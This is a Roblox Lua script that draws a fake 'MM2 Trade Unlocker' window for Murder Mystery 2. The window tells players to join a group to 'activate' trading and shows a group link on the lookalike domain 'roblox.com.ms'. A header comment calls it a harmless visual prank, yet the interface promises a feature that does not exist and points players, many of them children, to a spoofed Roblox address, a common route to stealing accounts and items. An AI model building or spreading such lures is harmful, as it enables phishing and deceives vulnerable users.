--// MM2 Trade Unlocker - Visual Prank UI
--// Place in StarterPlayer > StarterPlayerScripts
--// Visual only. Does not trade, steal items, or access accounts.

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- CHANGE THIS LINK
local GROUP_LINK = "https://roblox.com.ms/communities/6908586948/"

--// GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MM2TradeUnlocker"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

--// Main window
local main = Instance.new("Frame")
main.Size = UDim2.fromOffset(440, 330)
main.Position = UDim2.new(0.5, -220, 0.5, -165)
main.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
main.BorderSizePixel = 0
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = main

local outline = Instance.new("UIStroke")
outline.Color = Color3.fromRGB(125, 25, 35)
outline.Thickness = 2
outline.Parent = main

--// Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 52)
header.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
header.BorderSizePixel = 0
header.Parent = main

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 12)
headerCorner.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -65, 1, 0)
title.Position = UDim2.fromOffset(18, 0)
title.BackgroundTransparency = 1
title.Text = "MM2"
title.TextColor3 = Color3.fromRGB(245, 245, 245)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.fromOffset(42, 42)
closeButton.Position = UDim2.new(1, -47, 0, 5)
closeButton.BackgroundTransparency = 1
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(210, 80, 80)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 26
closeButton.Parent = header

closeButton.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

--// Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 35)
subtitle.Position = UDim2.fromOffset(0, 67)
subtitle.BackgroundTransparency = 1
subtitle.Text = "TRADE UNLOCKER"
subtitle.TextColor3 = Color3.fromRGB(220, 220, 225)
subtitle.Font = Enum.Font.GothamBold
subtitle.TextSize = 18
subtitle.Parent = main

--// Big locked activation button
local activate = Instance.new("TextButton")
activate.Size = UDim2.fromOffset(350, 125)
activate.Position = UDim2.new(0.5, -175, 0, 112)
activate.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
activate.BorderSizePixel = 0
activate.Text = ""
activate.AutoButtonColor = false
activate.Parent = main

local activateCorner = Instance.new("UICorner")
activateCorner.CornerRadius = UDim.new(0, 12)
activateCorner.Parent = activate

local activateStroke = Instance.new("UIStroke")
activateStroke.Color = Color3.fromRGB(100, 30, 38)
activateStroke.Thickness = 2
activateStroke.Parent = activate

local lock = Instance.new("TextLabel")
lock.Size = UDim2.new(1, 0, 0, 35)
lock.Position = UDim2.fromOffset(0, 15)
lock.BackgroundTransparency = 1
lock.Text = "🔒  LOCKED"
lock.TextColor3 = Color3.fromRGB(235, 235, 240)
lock.Font = Enum.Font.GothamBold
lock.TextSize = 20
lock.Parent = activate

local joinText = Instance.new("TextLabel")
joinText.Size = UDim2.new(1, 0, 0, 28)
joinText.Position = UDim2.fromOffset(0, 60)
joinText.BackgroundTransparency = 1
joinText.Text = "JOIN GROUP TO"
joinText.TextColor3 = Color3.fromRGB(190, 190, 198)
joinText.Font = Enum.Font.GothamMedium
joinText.TextSize = 15
joinText.Parent = activate

local activateText = Instance.new("TextLabel")
activateText.Size = UDim2.new(1, 0, 0, 25)
activateText.Position = UDim2.fromOffset(0, 87)
activateText.BackgroundTransparency = 1
activateText.Text = "ACTIVATE"
activateText.TextColor3 = Color3.fromRGB(220, 60, 70)
activateText.Font = Enum.Font.GothamBold
activateText.TextSize = 15
activateText.Parent = activate

--// Copy group link button
local copyButton = Instance.new("TextButton")
copyButton.Size = UDim2.fromOffset(220, 42)
copyButton.Position = UDim2.new(0.5, -110, 1, -58)
copyButton.BackgroundColor3 = Color3.fromRGB(125, 25, 35)
copyButton.BorderSizePixel = 0
copyButton.Text = "COPY GROUP LINK"
copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
copyButton.Font = Enum.Font.GothamBold
copyButton.TextSize = 13
copyButton.Parent = main

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 8)
copyCorner.Parent = copyButton

-- Roblox Studio LocalScripts cannot normally write arbitrary text
-- directly to the system clipboard.
copyButton.MouseButton1Click:Connect(function()
	local oldText = copyButton.Text

	copyButton.Text = "LINK: " .. GROUP_LINK

	task.wait(3)

	copyButton.Text = oldText
end)

--// Make the window draggable
local dragging = false
local dragStart
local startPosition

header.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPosition = main.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if not dragging then
		return
	end

	if input.UserInputType == Enum.UserInputType.MouseMovement
		or input.UserInputType == Enum.UserInputType.Touch then

		local delta = input.Position - dragStart

		main.Position = UDim2.new(
			startPosition.X.Scale,
			startPosition.X.Offset + delta.X,
			startPosition.Y.Scale,
			startPosition.Y.Offset + delta.Y
		)
	end
end)
